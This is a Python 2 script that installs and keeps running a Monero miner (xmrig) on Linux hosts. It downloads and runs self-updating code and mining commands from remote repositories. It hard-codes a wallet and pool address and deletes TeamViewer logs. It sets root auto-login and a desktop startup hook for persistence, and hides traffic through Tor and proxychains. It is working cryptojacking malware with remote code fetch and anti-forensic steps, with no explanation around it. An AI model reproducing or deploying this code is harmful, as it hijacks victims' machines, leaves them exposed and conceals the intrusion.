#!/usr/bin/env python
__author__ = 'root'
import time,socket
import urllib2
import urllib
import os, sh, sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
proxy_error = 0
final_proxy = ''
os.system('chmod 777 ' + __file__)
program = 'xmrig'
os.system('pkill ' + program)
# from pyvirtualdisplay import Display
# file = raw_input("Input link file:")
# solanlap = int(raw_input("Input how many replay:"))
cores = int(multiprocessing.cpu_count()/2)
print 'So luong cores cpu la ' + str(cores)
if cores <= 0:
    cores = 1
if cores == 1 or cores == 2:
    affinity = '0x5'
elif cores == 3 or cores == 4 :
    affinity = '0x55'
elif cores == 5 or cores == 6 :
    affinity = '0x555'
elif cores == 7 or cores == 8 :
    affinity = '0x5555'
elif cores == 9 or cores == 10 :
    affinity = '0x55555'
elif cores == 11 or cores == 12 :
    affinity = '0x555555'
elif cores == 13 or cores == 14 :
    affinity = '0x5555555'
elif cores == 15 or cores == 16 :
    affinity = '0x55555555'
elif cores == 17 or cores == 18 :
    affinity = '0x555555555'
elif cores == 19 or cores == 20 :
    affinity = '0x5555555555'
print affinity
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
def renew_connection():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="Hoanglan@123")
    conn.send_signal("NEWNYM")
    conn.close()
if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/proxy') == True:
    openproxy = open(os.path.dirname(os.path.realpath(__file__)) + '/proxy', 'r')
    proxy = openproxy.read().strip()
    openproxy.close()
    useproxy = 1
    readtestproxy = ''
    #openrealproxy = open(os.path.dirname(os.path.realpath(__file__)) + '/proxy1', 'r')
    #realproxy = openrealproxy.read().strip()
    #openrealproxy.close
    print proxy
if useproxy == 1:
    arrayproxy = proxy.split(":")
    ip = arrayproxy[0].strip()
    port = arrayproxy[1].strip()
    #ip = str(ip)
    #time.sleep(100000)
    opensocket = socket.socket()
    #print opensocket
    try:
        connect = opensocket.connect((ip,int(port)))
        realproxy = "{'https': '" + proxy + "'}"
        proxy_error = 0
        print realproxy
    except:
        print 'Error connect proxy at ' + ip + ':' + port
        proxy_error = 1
    if proxy_error == 0:
        linktestproxy = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/proxyok'
        #linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
        try:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
            downloadtestproxy = urllib2.urlopen(linktestproxy)
            readtestproxy = downloadtestproxy.read().strip()
            print readtestproxy
        except:
            pass
        if readtestproxy <> 'proxy_ok':
            try:
                print 'Proxy error'
                linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
                print linktestproxy
                proxytext = ast.literal_eval(realproxy)
                print proxytext
                proxyuse = urllib2.ProxyHandler(proxytext)
                opener = urllib2.build_opener(proxyuse)
                urllib2.install_opener(opener)
                downloadtestproxy = urllib2.urlopen(linktestproxy)
                readtestproxy = downloadtestproxy.read().strip()
                print readtestproxy
            except:
                pass
            if readtestproxy <> 'proxy_ok':
                print "Proxy error"
                proxy_error = 1
            else:
                print 'Connected proxy at ' + ip + ':' + port
                final_proxy = ip + ':' + str(port)
                opensocket.close()
        else:
            print 'Connected proxy at ' + ip + ':' + port
            final_proxy = ip + ':' + str(port)
            opensocket.close()
    if proxy_error == 1:
        proxy_error = 0
        allproxy = ('10.53.224.212,10.53.224.219,10.53.224.20,10.16.224.205,10.16.224.200,10.16.224.7,10.41.226.31,10.41.224.211,10.41.224.20,10.38.224.20,10.51.224.214,10.51.224.212,10.51.224.20,10.30.224.211,10.30.224.235,10.30.224.20,10.17.224.212,10.17.224.20,10.11.226.21,10.11.224.20,10.29.224.221,10.29.224.211,10.29.224.20,10.32.224.48,10.32.224.20')
        allport = ('8118,8118,8080,8118,8118,8080,8118,8118,8080,1961,8118,8118,8080,8118,8118,8080,8118,8080,8118,8080,8118,8118,8080,8118,8080')
        arrayallproxy = allproxy.split( ",")
        arrayallport = allport.split(",")
        for i in range(0,len(arrayallproxy),1):
            try:
                print arrayallproxy[i] + ':' + arrayallport[i]
                connect = opensocket.connect((arrayallproxy[i], int(arrayallport[i])))
                realproxy = "{'https': '" + arrayallproxy[i] + ":" + arrayallport[i] + "'}"
                proxy_error = 0
                print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
            except:
                print 'Error connect proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                proxy_error = 1
                pass
            if proxy_error == 0:
                linktestproxy = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/proxyok'
                # linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
                print linktestproxy
                try:
                    proxytext = ast.literal_eval(realproxy)
                    print proxytext
                    proxyuse = urllib2.ProxyHandler(proxytext)
                    opener = urllib2.build_opener(proxyuse)
                    urllib2.install_opener(opener)
                    downloadtestproxy = urllib2.urlopen(linktestproxy)
                    readtestproxy = downloadtestproxy.read().strip()
                    print readtestproxy
                    final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                except:
                    pass
                if readtestproxy <> 'proxy_ok':
                    try:
                        print 'Connect google drive error, try github'
                        linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
                        print linktestproxy
                        proxytext = ast.literal_eval(realproxy)
                        print proxytext
                        proxyuse = urllib2.ProxyHandler(proxytext)
                        opener = urllib2.build_opener(proxyuse)
                        urllib2.install_opener(opener)
                        downloadtestproxy = urllib2.urlopen(linktestproxy)
                        readtestproxy = downloadtestproxy.read().strip()
                        print readtestproxy
                    except:
                        pass
                    if readtestproxy <> 'proxy_ok':
                        print "Proxy error"
                        proxy_error = 1
                        useproxy = 0
                    else:
                        print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                        opensocket.close()
                        final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                        break
                else:
                    print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                    final_proxy = arrayallproxy[i] + ':' + arrayallport[i]
                    opensocket.close()
                    break
if proxy_error == 1:
    useproxy = 0
print 'Use proxy = '+ str(useproxy)
version = '9.8'
print 'Version do doc tren may la ' + version
linkversion = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/versiondao'
readversion = ''
#linkversion = 'https://google.com'
try:
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    else:
        proxyuse = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadversion = urllib2.urlopen(linkversion)
    readversion = downloadversion.read().strip()
    print 'Version dao doc tren web la ' + readversion
except:
    pass
if len(readversion) > 50 or readversion == '':
    print 'Download file readversion o google drive error, thu link github'
    linkversion = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondao'
    try:
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        else:
            proxyuse = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadversion = urllib2.urlopen(linkversion)
        readversion = downloadversion.read().strip()
        if len(readversion) > 50 or readversion == '':
            readversion = version
    except:
        readversion = version
        pass
    #print 'dang o day'
    print readversion
if version != readversion:
    noidung = ''
    linkcodedao = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/dao.py'
    try:
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        else:
            proxyuse = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadlinkcodedao = urllib2.urlopen(linkcodedao)
        noidung = downloadlinkcodedao.read()
        if noidung.find('/usr/bin/env') != -1:
            code = open(os.path.realpath(__file__), 'w')
            code.write(noidung)
            code.close()
            print "Update Code"
            # restart code
            os.execv(__file__, sys.argv)
    except:
        pass
    if noidung.find('/usr/bin/env') == -1:
        print "Download codedao tu google drive error, thu link github"
        linkcodedao = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/dao.py'
        try:
            if useproxy == 1:
                proxytext = ast.literal_eval(realproxy)
                proxyuse = urllib2.ProxyHandler(proxytext)
                opener = urllib2.build_opener(proxyuse)
                urllib2.install_opener(opener)
            else:
                proxyuse = urllib2.ProxyHandler({})
                opener = urllib2.build_opener(proxyuse)
                urllib2.install_opener(opener)
            downloadlinkcodedao = urllib2.urlopen(linkcodedao)
            downloadlinkcodedao = urllib2.urlopen(linkcodedao)
            noidung = downloadlinkcodedao.read()
        except:
            pass
        if noidung.find('/usr/bin/env') != -1:
            code = open(os.path.realpath(__file__), 'w')
            code.write(noidung)
            code.close()
            print "Update Code"
            os.execv(__file__, sys.argv)
try:
    os.system('rm -rf /opt/teamviewer/logfiles/*.log')
    os.system('rm -rf /opt/teamviewer/logfiles/*.txt')
except:
    pass
# Update cpuminer
versiondll = '2.8.1'
if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/xmrig/versiondll') == True:
    openpversiondll = open(os.path.dirname(os.path.realpath(__file__)) + '/xmrig/versiondll', 'r')
    versiondll = openpversiondll.read().strip()
    openpversiondll.close()
print 'Versiondll doc tren may la ' + versiondll
readversiondllnew = ''
linkversiondllnew = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/versiondllnew'
try:
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    else:
        proxyuse = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
    readversiondllnew = downloadversiondllnew.read().strip()
    print 'Versiondll doc tren web la ' + readversiondllnew
except:
    pass
if len(readversiondllnew) > 50 or readversiondllnew == '' :
    print 'Download file readversiondll o google drive error, thu link github'
    linkversiondllnew = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondllnew'
    try:
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        else:
            proxyuse = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
        readversiondllnew = downloadversiondllnew.read().strip()
        print readversiondllnew
        if len(readversiondllnew) > 50 or readversiondllnew == '':
            readversiondllnew = versiondll
    except:
        readversiondllnew = versiondll
if readversiondllnew != versiondll:
    #os.system('echo ' + readversiondllnew + ' >' + str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll')
    os.system('pkill yum')
    os.system('rm -rf xmrig')
    os.system('sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libmicrohttpd-devel libuv-static')
    if useproxy == 1:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + final_proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git')
    # time.sleep (30)
    os.chdir('xmrig')
    os.mkdir('build')
    os.chdir('build')
    os.system('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib64/libuv.a')
    os.system('make')
    workingdir = os.getcwd()
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')

linkcommand = 'https://gitlab.com/nhatquanglan/autoit_windows/raw/master/Linux_hq/command'
command = ''
commandread = ''
try:
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    else:
        proxyuse = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadlinkcommand = urllib2.urlopen(linkcommand)
    commandread = downloadlinkcommand.read().strip()
    if commandread.find(program) != -1:
        command = commandread + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
except:
    pass
if commandread.find(program) == -1:
    print 'Download command tu google drive bi loi, thu link github'
    linkcommand = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/command'
    try:
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        else:
            proxyuse = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadlinkcommand = urllib2.urlopen(linkcommand)
        commandread = downloadlinkcommand.read().strip()
        if commandread.find(program) != -1:
            command = commandread + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
        else:
            command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
    except:
        command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
# write to /etc/X11/xinit/xinitrc.d/localuser.sh
localuser = open('/etc/X11/xinit/xinitrc.d/localuser.sh', 'w')
localuser.write('#!/bin/bash\ngnome-terminal -e \'python \"/root/Desktop/dao.py\"\'')
localuser.close()
# write to /etc/gdm/custom.conf
custom = open('/etc/gdm/custom.conf', 'w')
custom.write('[daemon]\nAutomaticLoginEnable=True\nAutomaticLogin=root\n[security]\n\n[xdmcp]\n\n[greeter]\n\n[chooser]\n\n[debug]')
custom.close()
if os.path.isfile('/usr/local/bin/xmrig') == False:
    os.system('pkill yum')
    os.system('rm -rf xmrig')
    os.system('sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libmicrohttpd-devel libuv-static')
    # os.system ('yum localinstall -y rpm-cli.rpm')
    # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
    if useproxy == 1:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + final_proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git')
    # time.sleep (30)
    os.chdir('xmrig')
    os.mkdir('build')
    os.chdir('build')
    os.system('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib64/libuv.a')
    os.system('make')
    workingdir = os.getcwd()
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
if os.path.isfile('/usr/local/bin/proxychains4') == False:
    # os.system ('yum localinstall -y rpm-cli.rpm')
    # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
    if useproxy == 1:
        os.system('rm -rf proxychains-ng')
        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git --config \'http.proxy=' + final_proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git')
    # time.sleep (30)
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
if useproxy == 0:
    print command
    os.system(command + '&')
else:
    print command
    print 'starting tor'
    open_tor_file = open('/etc/tor/torrc', 'w')
    open_tor_file.write('DataDirectory /var/lib/tor' + '\n')
    open_tor_file.write('SocksListenAddress 0.0.0.0' + '\n')
    open_tor_file.write('SocksPolicy accept *' + '\n')
    open_tor_file.write('HTTPSProxy ' + final_proxy + '\n')
    open_tor_file.write('HTTPProxy ' + final_proxy + '\n')
    open_tor_file.close()
    os.system('systemctl restart tor')
    time.sleep (60)
    os.system('systemctl restart tor')
    time.sleep (60)
    os.system('proxychains4 ' + command + '&')
while 1:
    time.sleep(10800)
    os.execv(__file__, sys.argv)